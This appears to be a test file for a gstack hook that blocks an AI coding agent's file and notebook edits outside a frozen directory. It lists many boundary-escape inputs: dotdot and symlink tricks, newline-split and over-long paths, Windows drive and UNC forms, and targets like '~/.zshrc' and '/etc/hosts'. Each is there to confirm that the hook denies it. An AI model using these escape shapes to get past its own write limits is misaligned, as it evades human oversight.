  describe('broken install fails closed', () => {
    test('a missing hook-extract helper DENIES instead of proceeding', () => {
      // Copy the freeze hook into a tree with NO careful sibling — the source
      // fails, and a deny-tier boundary must fail CLOSED, not fall through.
      const base = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-freeze-broken-'));
      const binDir = path.join(base, 'freeze', 'bin');
      fs.mkdirSync(binDir, { recursive: true });
      const script = path.join(binDir, 'check-freeze.sh');
      fs.copyFileSync(FREEZE_SCRIPT, script);
      try {
        withFreezeDir('/Users/dev/project/src/', (stateDir) => {
          const { exitCode, output } = runHook(script, freezeInput('/Users/dev/project/src/x.ts'), freezeEnv(stateDir));
          expect(exitCode).toBe(0);
          expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
          expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('fail closed');
        });
      } finally {
        fs.rmSync(base, { recursive: true, force: true });
      }
    });
  });

  describe('symlink boundary escape', () => {
    // The old resolver followed the parent directory but NOT the final path
    // component, so an in-boundary symlink pointing outside the boundary was
    // allowed while the write landed outside.
    // Windows CI runners lack Developer Mode, so symlinkSync throws EPERM there.
    test.skipIf(process.platform === 'win32')('an in-boundary symlink to an outside target denies', () => {
      const base = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-freeze-link-'));
      const boundary = path.join(base, 'boundary');
      const outside = path.join(base, 'outside');
      fs.mkdirSync(boundary, { recursive: true });
      fs.mkdirSync(outside, { recursive: true });
      fs.writeFileSync(path.join(outside, 'secret.txt'), 'x');
      fs.symlinkSync(path.join(outside, 'secret.txt'), path.join(boundary, 'link.txt'));
      try {
        withFreezeDir(boundary + '/', (stateDir) => {
          const viaLink = runHook(FREEZE_SCRIPT, freezeInput(path.join(boundary, 'link.txt')), freezeEnv(stateDir));
          expect(viaLink.exitCode).toBe(0);
          expect(viaLink.output.hookSpecificOutput?.permissionDecision).toBe('deny');

          // A real in-boundary file is unaffected.
          fs.writeFileSync(path.join(boundary, 'real.txt'), 'y');
          const real = runHook(FREEZE_SCRIPT, freezeInput(path.join(boundary, 'real.txt')), freezeEnv(stateDir));
          expect(real.exitCode).toBe(0);
          expect(real.output.hookSpecificOutput?.permissionDecision).toBeUndefined();
        });
      } finally {
        fs.rmSync(base, { recursive: true, force: true });
      }
    });
  });

  describe('boundary escape shapes (#3623)', () => {
    // The old resolver canonicalized only an EXISTING parent directory and
    // otherwise compared the raw string, so any path through a directory that
    // did not exist yet kept its literal in-boundary prefix: '..' segments and
    // symlinks in it were never applied. Each case names the escape shape.
    function decide(boundary: string, filePath: string, home: string, cwd?: string): string {
      let decision = '';
      withFreezeDir(boundary + '/', (stateDir) => {
        const r = runHook(FREEZE_SCRIPT, freezeInput(filePath), freezeEnv(stateDir, { HOME: home }), cwd);
        expect(r.exitCode).toBe(0);
        decision = r.output.hookSpecificOutput?.permissionDecision ?? (r.raw === '{}' ? 'allow' : r.raw);
      });
      return decision;
    }

    function withTree(fn: (t: { base: string; home: string; src: string; outside: string }) => void) {
      const base = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-freeze-esc-')));
      const home = path.join(base, 'home');
      const src = path.join(home, 'proj', 'src');
      const outside = path.join(base, 'outside');
      fs.mkdirSync(src, { recursive: true });
      fs.mkdirSync(outside, { recursive: true });
      try {
        fn({ base, home, src, outside });
      } finally {
        fs.rmSync(base, { recursive: true, force: true });
      }
    }

    test('dotdot through a missing directory, a trailing dotdot, tilde and cwd-relative paths are resolved before the check', () => {
      withTree(({ base, home, src }) => {
        expect(decide(src, src + '/../../../outside/new-dir/x.ts', home, base)).toBe('deny');
        expect(decide(src, src + '/..', home, base)).toBe('deny');
        expect(decide(src, '~/.zshrc', home, src)).toBe('deny');
        expect(decide(src, '../../new-dir/x.ts', home, src)).toBe('deny');

        expect(decide(src, src + '/new-dir/x.ts', home, base)).toBe('allow');
        expect(decide(src, src + '/a/../b/x.ts', home, base)).toBe('allow');
        expect(decide(src, '~/proj/src/x.ts', home, base)).toBe('allow');
        expect(decide(src, 'new-dir/x.ts', home, src)).toBe('allow');
      });
    });

    // A per-line sed squeezed slashes, so a newline split '..' off the next
    // name ('<b>/../\nfoo.ts' read as inside, landed in the parent), and the
    // extractor dropped a trailing one ('<b>\n' is a sibling of the boundary).
    // No real file name holds a line break, so any path with one denies.
    test('a line break in the path denies instead of hiding a dotdot or a sibling', () => {
      withTree(({ base, home, src }) => {
        expect(decide(src, src + '/../\nfoo.ts', home, base)).toBe('deny');
        expect(decide(src, src + '/../\n/x.ts', home, base)).toBe('deny');
        expect(decide(src, src + '\n', home, base)).toBe('deny');
        expect(decide(src, src + '/new\r/x.ts', home, base)).toBe('deny');
      });
    });

    // The walk is quadratic in path length, and a PreToolUse hook that times
    // out does not block the edit; an over-long path must deny fast.
    test('a path longer than PATH_MAX denies quickly instead of stalling the hook', () => {
      withTree(({ base, home, src }) => {
        const started = Date.now();
        expect(decide(src, src + '/a/..'.repeat(20000) + '/../outside/x.ts', home, base)).toBe('deny');
        expect(Date.now() - started).toBeLessThan(4000);
        expect(decide(src, src + '/a/..'.repeat(500) + '/x.ts', home, base)).toBe('allow');
      });
    });

    // Link targets re-expand the walk, so their total is bounded too: a chain
    // of padded links must deny fast instead of running for minutes.
    test.skipIf(process.platform === 'win32')('a symlink chain whose targets add up past 8192 characters denies quickly', () => {
      withTree(({ base, home, src, outside }) => {
        // Each target pads with 'name/..' pairs (few components, so the walk
        // itself stays cheap) to about 3,800 characters; three hops pass 8192.
        const pad = ('n'.repeat(250) + '/../').repeat(15);
        fs.symlinkSync(pad + path.relative(src, outside), path.join(src, 'p3'));
        fs.symlinkSync(pad + 'p3', path.join(src, 'p2'));
        fs.symlinkSync(pad + 'p2', path.join(src, 'p1'));
        const started = Date.now();
        expect(decide(src, src + '/p1/x.ts', home, base)).toBe('deny');
        expect(Date.now() - started).toBeLessThan(4000);
      });
    });

    test('Windows separators: a C:\\ dotdot escape through a missing directory denies, a new C:\\ subdirectory allows', () => {
      withTree(({ base, home }) => {
        expect(decide('C:\\dev\\proj\\src', 'C:\\dev\\proj\\src\\..\\..\\other\\new\\x.ts', home, base)).toBe('deny');
        expect(decide('C:\\dev\\proj\\src', 'C:/dev/proj/src/../../other/new/x.ts', home, base)).toBe('deny');
        expect(decide('C:\\dev\\proj\\src', 'C:\\dev\\proj\\src\\new\\x.ts', home, base)).toBe('allow');
      });
    });

    // Windows never climbs above X:\ or \\server\share: 'C:\..\c\dev' is
    // C:\c\dev. A walker that popped the root would read it as C:\dev.
    test('dotdot stops at a drive root and a UNC share root', () => {
      withTree(({ base, home }) => {
        expect(decide('C:\\dev\\proj\\src', 'C:\\..\\c\\dev\\proj\\src\\x.ts', home, base)).toBe('deny');
        expect(decide('\\\\server.invalid\\share\\proj', '\\\\server.invalid\\share\\..\\..\\server.invalid\\share\\proj\\x.ts', home, base)).toBe('deny');
        expect(decide('\\\\server.invalid\\share\\proj', '\\\\server.invalid\\share\\proj\\new\\x.ts', home, base)).toBe('allow');
      });
    });

    // Windows bash rules, run on any platform by setting OSTYPE before the
    // hook loads its helpers.
    function decideOnWindowsBash(boundary: string, filePath: string, home: string, cwd: string): string {
      let decision = '';
      withFreezeDir(boundary + '/', (stateDir) => {
        const r = spawnSync('bash', ['-c', 'OSTYPE=msys; . "$0"', FREEZE_SCRIPT], {
          input: JSON.stringify(freezeInput(filePath)),
          env: { ...process.env, ...freezeEnv(stateDir, { HOME: home }) },
          cwd,
          timeout: 5000,
        });
        expect(r.status).toBe(0);
        const raw = r.stdout.toString().trim();
        decision = raw === '{}' ? 'allow' : (JSON.parse(raw).hookSpecificOutput?.permissionDecision ?? raw);
      });
      return decision;
    }

    test('Windows bash: drive-relative paths and names Windows trims are denied, fail closed', () => {
      withTree(({ base, home, src }) => {
        expect(decideOnWindowsBash(src, 'C:..\\..\\x.ts', home, src)).toBe('deny');
        expect(decideOnWindowsBash(src, 'C:x.ts', home, src)).toBe('deny');
        expect(decideOnWindowsBash('C:\\dev\\proj\\src', 'C:\\dev\\proj\\src\\.. \\x.ts', home, base)).toBe('deny');
        expect(decideOnWindowsBash('C:\\dev\\proj\\src', 'C:\\dev\\proj\\src\\...\\x.ts', home, base)).toBe('deny');
        expect(decideOnWindowsBash('C:\\dev\\proj\\src', '\\c\\dev\\proj\\src\\x.ts', home, base)).toBe('deny');
        expect(decideOnWindowsBash('C:\\dev\\proj\\src', '\\\\\\c\\..\\c\\dev\\proj\\src\\x.ts', home, base)).toBe('deny');
        expect(decideOnWindowsBash('\\\\server.invalid\\share\\proj', '\\\\server.invalid\\..\\share\\proj\\x.ts', home, base)).toBe('deny');
        expect(decideOnWindowsBash('C:\\dev\\proj\\src', '\\\\.\\C:\\dev\\proj\\src\\x.ts', home, base)).toBe('deny');
        expect(decideOnWindowsBash('C:\\dev\\proj\\src', '///c/dev/proj/src/x.ts', home, base)).toBe('deny');
        expect(decideOnWindowsBash('C:\\dev\\proj\\src', '\\\\/c/dev/proj/src/x.ts', home, base)).toBe('deny');
        expect(decideOnWindowsBash('C:\\', 'C:', home, base)).toBe('deny');
        expect(decideOnWindowsBash('C:\\dev\\proj\\src', 'C:\\dev\\proj\\src\\new\\x.ts', home, base)).toBe('allow');
      });
    });

    // Windows reads a link target of '\\x' against the link's drive root and
    // 'C:x' against drive C's own working directory; normalized as /x or C:/x,
    // either read as inside while the write landed elsewhere.
    test.skipIf(process.platform === 'win32')('Windows bash: a link target relative to a drive or its root denies, fail closed', () => {
      withTree(({ home, src }) => {
        fs.symlinkSync(src.split('/').join('\\'), path.join(src, 'rootrel'));
        fs.symlinkSync('C:x', path.join(src, 'driverel'));
        fs.symlinkSync('\\', path.join(src, 'bare'));
        fs.mkdirSync(path.join(src, 'real'));
        fs.symlinkSync(path.join(src, 'real'), path.join(src, 'fwd'));
        expect(decideOnWindowsBash(src, src + '/rootrel/x.ts', home, src)).toBe('deny');
        expect(decideOnWindowsBash(src, src + '/driverel/x.ts', home, src)).toBe('deny');
        expect(decideOnWindowsBash(src, src + '/bare' + src + '/x.ts', home, src)).toBe('deny');
        expect(decideOnWindowsBash(src, src + '/fwd/x.ts', home, src)).toBe('allow');
      });
    });

    // Git Bash reaches one folder through several mounts (/tmp is %TEMP%, and
    // HOME converts through them), so '~/x' and 'D:\\...\\x' can name one file
    // in two spellings; the hook compares cygpath's drive spelling.
    test.skipIf(process.platform === 'win32')('Windows bash: a folder reached through a Git Bash mount compares by its drive spelling', () => {
      withTree(({ base, home, src, outside }) => {
        const bin = path.join(base, 'bin');
        fs.mkdirSync(bin);
        const mnt = path.join(base, 'mnt');
        fs.writeFileSync(path.join(bin, 'cygpath'), [
          '#!/bin/bash',
          'case "$2" in',
          '  "$FAKE_MNT"/in/*) printf "%s\\n" "$FAKE_IN${2#"$FAKE_MNT"/in}" ;;',
          '  "$FAKE_MNT"/out/*) printf "%s\\n" "$FAKE_OUT${2#"$FAKE_MNT"/out}" ;;',
          '  *) printf "%s\\n" "$2" ;;',
          'esac',
          '',
        ].join('\n'), { mode: 0o755 });
        const decideWithCygpath = (filePath: string): string => {
          let decision = '';
          withFreezeDir(src + '/', (stateDir) => {
            const r = spawnSync('bash', ['-c', 'OSTYPE=msys; . "$0"', FREEZE_SCRIPT], {
              input: JSON.stringify(freezeInput(filePath)),
              env: { ...process.env, ...freezeEnv(stateDir, { HOME: home }), PATH: bin + path.delimiter + (process.env.PATH ?? ''), FAKE_MNT: mnt, FAKE_IN: home, FAKE_OUT: outside },
              cwd: base,
              timeout: 5000,
            });
            expect(r.status).toBe(0);
            const raw = r.stdout.toString().trim();
            decision = raw === '{}' ? 'allow' : (JSON.parse(raw).hookSpecificOutput?.permissionDecision ?? raw);
          });
          return decision;
        };
        expect(decideWithCygpath(mnt + '/in/proj/src/x.ts')).toBe('allow');
        expect(decideWithCygpath(mnt + '/out/proj/src/x.ts')).toBe('deny');
        expect(decideWithCygpath(src + '/x.ts')).toBe('allow');
      });
    });

    // Linux and macOS read a leading '//' as '/', so neither a '//' path nor a
    // link to '//' may borrow a UNC boundary, and a link to '/' followed by
    // '/' stays a plain absolute path.
    test.skipIf(process.platform === 'win32')('POSIX: a double slash is the root, never a UNC prefix', () => {
      withTree(({ base, home, src }) => {
        fs.symlinkSync('//', path.join(base, 'dbl'));
        fs.symlinkSync('/', path.join(base, 'root'));
        const unc = '\\\\server.invalid\\share\\proj';
        expect(decide(unc, base + '/dbl/server.invalid/share/proj/x.ts', home, base)).toBe('deny');
        expect(decide(unc, '//server.invalid/share/proj/x.ts', home, base)).toBe('deny');
        expect(decide(src, base + '/root/' + src + '/x.ts', home, base)).toBe('allow');
        expect(decide(src, '/' + src + '/x.ts', home, base)).toBe('allow');
      });
    });

    // On POSIX '\\' is a filename character, so a name that spells '..' with
    // backslashes is one directory, not a way back into the boundary.
    test.skipIf(process.platform === 'win32')('a POSIX backslash name that spells dotdot never counts as inside', () => {
      withTree(({ base, home, src, outside }) => {
        expect(decide(src, outside + '/..\\home\\proj\\src\\x.ts', home, base)).toBe('deny');
      });
    });

    // On POSIX, '\\/...' is a relative name, not a UNC path, and a Windows-
    // shaped path names no local file: neither may borrow Windows rules or
    // local symlinks to read as inside while Node writes elsewhere.
    test.skipIf(process.platform === 'win32')('POSIX: a backslash prefix never turns a relative escape into a UNC path inside the boundary', () => {
      withTree(({ base, home, src }) => {
        const bs = src.slice(1).split('/').join('\\');
        expect(decide(src, '\\\\/' + bs + '\\a\\b\\c/../../../outside/x.ts', home, src)).toBe('deny');

        fs.mkdirSync(path.join(base, 'real', 'bnd'), { recursive: true });
        fs.symlinkSync(path.join(base, 'real'), path.join(base, 'alias'));
        const aliasBnd = path.join(base, 'alias', 'bnd');
        const abs = aliasBnd.slice(1).split('/').join('\\');
        expect(decide(aliasBnd, '\\\\' + abs + '\\a\\b/../../outside/x.ts', home, path.join(base, 'real', 'bnd'))).toBe('deny');
      });
    });

    // The host resolves a relative path against its physical cwd; a logical
    // $PWD through a symlink names a different parent for '..'.
    test.skipIf(process.platform === 'win32')('a relative path resolves against the physical working directory', () => {
      withTree(({ base, home, src, outside }) => {
        const work = path.join(outside, 'work');
        fs.mkdirSync(work);
        fs.mkdirSync(path.join(src, 'a', 'b'), { recursive: true });
        fs.symlinkSync(work, path.join(src, 'work-link'));
        fs.symlinkSync(path.join(src, 'a', 'b'), path.join(outside, 'hop'));
        let decision = '';
        withFreezeDir(src + '/', (stateDir) => {
          const r = runHook(FREEZE_SCRIPT, freezeInput('../hop/../x.ts'), freezeEnv(stateDir, { HOME: home, PWD: path.join(src, 'work-link') }), work);
          decision = r.output.hookSpecificOutput?.permissionDecision ?? (r.raw === '{}' ? 'allow' : r.raw);
        });
        expect(decision).toBe('deny');
      });
    });

    // Python used to write a lone UTF-16 surrogate as WTF-8 bytes while Node
    // writes U+FFFD, so the hook looked up a different name than the host
    // followed.
    test.skipIf(process.platform === 'win32')('a lone surrogate names the same file the host writes', () => {
      withTree(({ base, home, src, outside }) => {
        fs.symlinkSync(outside, path.join(src, 'a\uFFFD'));
        expect(decide(src, src + '/a\ud800/x.ts', home, base)).toBe('deny');
      });
    });

    // The extractor tries python3, then node; with both on PATH a broken
    // python branch hides behind node, and CI never takes the node branch
    // that Windows hosts with a python3 Store stub run. Pin each one alone.
    test.skipIf(process.platform === 'win32').each(['python3', 'node'])('with %s failing, the other extractor branch still keeps a path trailing newline', (broken) => {
      withTree(({ base, home, src }) => {
        const shim = path.join(base, 'shim');
        fs.mkdirSync(shim);
        fs.writeFileSync(path.join(shim, broken), '#!/bin/sh\nexit 1\n', { mode: 0o755 });
        const env = { PATH: shim + path.delimiter + (process.env.PATH ?? '') };
        withFreezeDir(src + '/', (stateDir) => {
          const trailing = runHook(FREEZE_SCRIPT, freezeInput(src + '\n'), freezeEnv(stateDir, { HOME: home, ...env }), base);
          expect(trailing.output.hookSpecificOutput?.permissionDecision).toBe('deny');
          expect(trailing.output.hookSpecificOutput?.permissionDecisionReason).toContain('line break');
          const inside = runHook(FREEZE_SCRIPT, freezeInput(src + '/x.ts'), freezeEnv(stateDir, { HOME: home, ...env }), base);
          expect(inside.raw).toBe('{}');
        });
      });
    });

    // Linux paths are case-sensitive: a case variant is another directory.
    // macOS volumes usually fold case, where the same denial is a safe false
    // deny that this test deliberately does not pin.
    test.skipIf(process.platform !== 'linux')('a case variant of the boundary is outside it on a case-sensitive filesystem', () => {
      withTree(({ base, home, src }) => {
        expect(decide(src, base + '/HOME/proj/src/x.ts', home, base)).toBe('deny');
      });
    });

    // Windows CI runners lack Developer Mode, so symlinkSync throws EPERM there.
    test.skipIf(process.platform === 'win32')('symlinks at any depth are followed, even when the rest of the path does not exist', () => {
      withTree(({ base, home, src, outside }) => {
        fs.symlinkSync(outside, path.join(src, 'out-link'));
        fs.symlinkSync('../../../outside', path.join(src, 'up-link'));
        fs.symlinkSync(path.join(outside, 'not-yet'), path.join(src, 'dangle'));
        fs.mkdirSync(path.join(src, 'sub'));
        fs.symlinkSync(path.join(src, 'sub'), path.join(outside, 'in-link'));

        expect(decide(src, src + '/out-link/new-dir/x.ts', home, base)).toBe('deny');
        expect(decide(src, src + '/out-link/', home, base)).toBe('deny');
        expect(decide(src, src + '/up-link/new-dir/x.ts', home, base)).toBe('deny');
        expect(decide(src, src + '/dangle/x.ts', home, base)).toBe('deny');
        // '..' after a symlink means the target's parent to the OS but the
        // link's parent to a lexical normalizer; both readings must be inside.
        expect(decide(src, src + '/out-link/../x.ts', home, base)).toBe('deny');
        expect(decide(src, outside + '/in-link/../x.ts', home, base)).toBe('deny');

        expect(decide(src, outside + '/in-link/new-dir/x.ts', home, base)).toBe('allow');

        // On POSIX a link target is POSIX text: 'C:\..' + src is one file
        // name beside the link, not drive C's parent.
        fs.symlinkSync('C:\\..' + src, path.join(outside, 'drive-text'));
        expect(decide(src, outside + '/drive-text/x.ts', home, base)).toBe('deny');
        // A link whose target ends in a newline is a sibling, not the target.
        fs.symlinkSync('../src\n', path.join(home, 'proj', 'nl-link'));
        expect(decide(src, path.join(home, 'proj', 'nl-link', 'x.ts'), home, base)).toBe('deny');
        fs.symlinkSync('/', path.join(src, 'root-link'));
        expect(decide(src, src + '/root-link' + outside + '/x.ts', home, base)).toBe('deny');
      });
    });

    test.skipIf(process.platform === 'win32')('a symlink that cannot be resolved (loop, chain over 40 hops) denies, fail closed', () => {
      withTree(({ base, home, src }) => {
        fs.symlinkSync(path.join(src, 'loop-b'), path.join(src, 'loop-a'));
        fs.symlinkSync(path.join(src, 'loop-a'), path.join(src, 'loop-b'));
        let prev = path.join(base, 'outside', 'not-yet');
        for (let i = 1; i <= 45; i++) {
          const link = path.join(src, `chain-${i}`);
          fs.symlinkSync(prev, link);
          prev = link;
        }
        expect(decide(src, src + '/loop-a/x.ts', home, base)).toBe('deny');
        expect(decide(src, src + '/chain-45/new-dir/x.ts', home, base)).toBe('deny');
      });
    });

    test.skipIf(process.platform === 'win32')('a boundary saved through a symlinked parent (macOS /tmp) allows a new subdirectory under either spelling', () => {
      withTree(({ base, home }) => {
        fs.mkdirSync(path.join(base, 'real', 'bnd'), { recursive: true });
        fs.symlinkSync(path.join(base, 'real'), path.join(base, 'alias'));
        const boundary = path.join(base, 'alias', 'bnd');
        expect(decide(boundary, boundary + '/new-dir/x.ts', home, base)).toBe('allow');
        expect(decide(boundary, path.join(base, 'real', 'bnd', 'new-dir', 'x.ts'), home, base)).toBe('allow');
        expect(decide(boundary, path.join(base, 'real', 'x.ts'), home, base)).toBe('deny');
      });
    });
  });
});

// ============================================================
// check-freeze.sh on NotebookEdit (#3067)
// ============================================================
// Payload shape: NotebookEdit sends tool_input.notebook_path (plus cell_id,
// new_source, cell_type, edit_mode) and no file_path (Claude Code Agent SDK
// reference, NotebookEditInput, code.claude.com/docs/en/agent-sdk/typescript).
function notebookInput(notebookPath: string) {
  return { tool_name: 'NotebookEdit', tool_input: { notebook_path: notebookPath, new_source: 'print(1)', edit_mode: 'replace' } };
}

describe('check-freeze.sh NotebookEdit boundary (#3067)', () => {
  const BOUNDARY = '/Users/dev/project/src/';

  test('a notebook inside the boundary allows', () => {
    withFreezeDir(BOUNDARY, (stateDir) => {
      const { exitCode, output } = runHook(FREEZE_SCRIPT, notebookInput('/Users/dev/project/src/analysis.ipynb'), freezeEnv(stateDir));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });
  });

  test('a notebook outside the boundary denies, naming tool, notebook_path, boundary and /unfreeze', () => {
    withFreezeDir(BOUNDARY, (stateDir) => {
      const { exitCode, output } = runHook(FREEZE_SCRIPT, notebookInput('/etc/x.ipynb'), freezeEnv(stateDir));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
      const reason: string = output.hookSpecificOutput?.permissionDecisionReason ?? '';
      expect(reason).toContain('NotebookEdit');
      expect(reason).toContain('notebook_path');
      expect(reason).toContain('/etc/x.ipynb');
      expect(reason).toContain('/Users/dev/project/src');
      expect(reason).toContain('/unfreeze');
    });
  });

  test('a C:/ notebook path is normalized and denied outside a POSIX boundary', () => {
    withFreezeDir(BOUNDARY, (stateDir) => {
      const { output } = runHook(FREEZE_SCRIPT, notebookInput('C:/Users/dev/other/x.ipynb'), freezeEnv(stateDir));
      expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('/c/Users/dev/other/x.ipynb');
    });
  });

  test('a C:\\ notebook inside a C:\\ boundary allows', () => {
    withFreezeDir('C:\\dev\\proj\\', (stateDir) => {
      const { output } = runHook(FREEZE_SCRIPT, notebookInput('C:\\dev\\proj\\nb\\x.ipynb'), freezeEnv(stateDir));
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });
  });

  test('file_path wins when both fields are present', () => {
    withFreezeDir(BOUNDARY, (stateDir) => {
      const input = { tool_name: 'NotebookEdit', tool_input: { file_path: '/etc/x.ipynb', notebook_path: '/Users/dev/project/src/a.ipynb' } };
      const { output } = runHook(FREEZE_SCRIPT, input, freezeEnv(stateDir));
      expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
    });
  });

  test('a malformed NotebookEdit payload denies (fail closed)', () => {
    withFreezeDir(BOUNDARY, (stateDir) => {
      const { exitCode, output } = runHookRaw(FREEZE_SCRIPT, '{"tool_name":"NotebookEdit","tool_input":{"notebook_path":"/etc/x', freezeEnv(stateDir));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
    });
  });

  test('Edit denials name the tool and file_path too', () => {
    withFreezeDir(BOUNDARY, (stateDir) => {
      const { output } = runHook(FREEZE_SCRIPT, { tool_name: 'Edit', tool_input: { file_path: '/etc/hosts' } }, freezeEnv(stateDir));
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('Edit file_path /etc/hosts');
    });
  });

  test('a hook helper that lacks gstack_hook_extract_tool DENIES as out of date', () => {
    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-freeze-oldextract-'));
    const freezeBin = path.join(base, 'freeze', 'bin');
    const carefulBin = path.join(base, 'careful', 'bin');
    fs.mkdirSync(freezeBin, { recursive: true });
    fs.mkdirSync(carefulBin, { recursive: true });
    fs.copyFileSync(FREEZE_SCRIPT, path.join(freezeBin, 'check-freeze.sh'));
    const helper = fs.readFileSync(HOOK_EXTRACT, 'utf-8');
    const start = helper.indexOf('gstack_hook_extract_tool() {');
    const end = helper.indexOf('\n}\n', start) + 3;
    fs.writeFileSync(path.join(carefulBin, 'hook-extract.sh'), helper.slice(0, start) + helper.slice(end));
    try {
      withFreezeDir(BOUNDARY, (stateDir) => {
        const { output } = runHook(path.join(freezeBin, 'check-freeze.sh'), notebookInput('/Users/dev/project/src/a.ipynb'), freezeEnv(stateDir));
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('out of date');
      });
    } finally {
      fs.rmSync(base, { recursive: true, force: true });
    }
  });
});

// ============================================================
// check-freeze.sh state-root resolution (#1459 / #1509)
// ============================================================
// /freeze writes freeze-dir.txt under the root gstack-paths resolves
// (GSTACK_HOME first). The reader used to read ${CLAUDE_PLUGIN_DATA:-$HOME/.gstack}
// — so with GSTACK_HOME set it found no file and ALLOWED everything. A deny-tier
// boundary that fails open is not a boundary; writer and reader now share one
// chain (gstack_hook_state_root in careful/bin/hook-extract.sh).
describe('check-freeze.sh state-root resolution (#1459 / #1509)', () => {
  const BOUNDARY = '/Users/dev/project/src/';
  const OUTSIDE = '/Users/dev/other-project/index.ts';


  test('REGRESSION: freeze file under GSTACK_HOME (HOME has none) denies an outside edit', () => {
    withFreezeDir(BOUNDARY, (gstackHome) => {
      withEmptyDir((fakeHome) => {
        const { exitCode, output } = runHook(FREEZE_SCRIPT, freezeInput(OUTSIDE), {
          GSTACK_HOME: gstackHome, HOME: fakeHome, CLAUDE_PLUGIN_DATA: '', CLAUDE_PLUGIN_ROOT: '',
        });
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
      });
    });
  });

  test('GSTACK_HOME wins over CLAUDE_PLUGIN_DATA (matches gstack-paths precedence)', () => {
    withFreezeDir(BOUNDARY, (pluginData) => {
      withEmptyDir((gstackHome) => {
        // The freeze file lives under CLAUDE_PLUGIN_DATA, but GSTACK_HOME is set and
        // has none — the writer would have written there, so the reader must look there.
        const { output } = runHook(FREEZE_SCRIPT, freezeInput(OUTSIDE),
          freezeEnv(pluginData, { GSTACK_HOME: gstackHome }));
        expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
      });
    });
  });

  test('CLAUDE_PLUGIN_DATA is ignored when CLAUDE_PLUGIN_ROOT is another plugin', () => {
    withFreezeDir(BOUNDARY, (pluginData) => {
      withEmptyDir((fakeHome) => {
        const { output } = runHook(FREEZE_SCRIPT, freezeInput(OUTSIDE),
          freezeEnv(pluginData, { CLAUDE_PLUGIN_ROOT: '/plugins/codex', HOME: fakeHome }));
        // Falls through to $HOME/.gstack, which has no freeze file → allow.
        expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
      });
    });
  });

  test('CLAUDE_PLUGIN_DATA is honoured when CLAUDE_PLUGIN_ROOT names gstack', () => {
    withFreezeDir(BOUNDARY, (pluginData) => {
      withEmptyDir((fakeHome) => {
        const { output } = runHook(FREEZE_SCRIPT, freezeInput(OUTSIDE), freezeEnv(pluginData, { HOME: fakeHome }));
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
      });
    });
  });

  test('gstack_hook_state_root is byte-identical to gstack-paths GSTACK_STATE_ROOT', () => {
    const combos: Record<string, string>[] = [
      { HOME: '/home/u', GSTACK_HOME: '/state/x', CLAUDE_PLUGIN_DATA: '/plug/data', CLAUDE_PLUGIN_ROOT: '/plugins/gstack' },
      { HOME: '/home/u', GSTACK_HOME: '', CLAUDE_PLUGIN_DATA: '/plug/data', CLAUDE_PLUGIN_ROOT: '/plugins/gstack' },
      { HOME: '/home/u', GSTACK_HOME: '', CLAUDE_PLUGIN_DATA: '/plug/data', CLAUDE_PLUGIN_ROOT: '/plugins/codex' },
      { HOME: '/home/u', GSTACK_HOME: '', CLAUDE_PLUGIN_DATA: '/plug/data', CLAUDE_PLUGIN_ROOT: '' },
      { HOME: '/home/u', GSTACK_HOME: '', CLAUDE_PLUGIN_DATA: '', CLAUDE_PLUGIN_ROOT: '' },
      { HOME: '', GSTACK_HOME: '', CLAUDE_PLUGIN_DATA: '', CLAUDE_PLUGIN_ROOT: '' },
    ];
    for (const env of combos) {
      expect(hookStateRoot(env)).toBe(pathsStateRoot(env));
    }
  });
});

// ============================================================
// gstack_hook_log_fire analytics sink follows the same state root (#1459)
// ============================================================
// The hook_fire record lands under the resolved state root (bin/gstack-state-root.sh)
// — the SAME root the freeze FILE and every other analytics writer and reader
// (gstack-skill-start, gstack-retro-metrics, gstack-analytics) use, so the usage
// log stays one file. Logging is best-effort: an unwritable sink never changes
// the decision.
describe('gstack_hook_log_fire writes under the resolved state root', () => {
  const BOUNDARY = '/Users/dev/project/src/';
  const OUTSIDE = '/Users/dev/other-project/index.ts';

  function lastRecord(file: string): any {
    const lines = fs.readFileSync(file, 'utf-8').trim().split('\n');
    return JSON.parse(lines[lines.length - 1]);
  }

  test('REGRESSION: a freeze deny under GSTACK_HOME appends hook_fire to $GSTACK_HOME/analytics, not $HOME/.gstack', () => {
    withFreezeDir(BOUNDARY, (gstackHome) => {
      withEmptyDir((fakeHome) => {
        const { exitCode, output } = runHook(FREEZE_SCRIPT, freezeInput(OUTSIDE), {
          GSTACK_HOME: gstackHome, HOME: fakeHome, CLAUDE_PLUGIN_DATA: '', CLAUDE_PLUGIN_ROOT: '',
        });
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
        const rec = lastRecord(path.join(gstackHome, 'analytics', 'skill-usage.jsonl'));
        expect(rec.event).toBe('hook_fire');
        expect(rec.skill).toBe('freeze');
        expect(rec.pattern).toBe('boundary_deny');
        expect(typeof rec.ts).toBe('string');
        expect(fs.existsSync(path.join(fakeHome, '.gstack'))).toBe(false);
      });
    });
  });

  test('plugin install: the freeze FILE and hook_fire both use CLAUDE_PLUGIN_DATA (one state root, one usage log)', () => {
    withFreezeDir(BOUNDARY, (pluginData) => {
      withEmptyDir((fakeHome) => {
        const { output } = runHook(FREEZE_SCRIPT, freezeInput(OUTSIDE),
          freezeEnv(pluginData, { HOME: fakeHome, CLAUDE_PLUGIN_ROOT: '/Plugins/GSTACK' }));
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
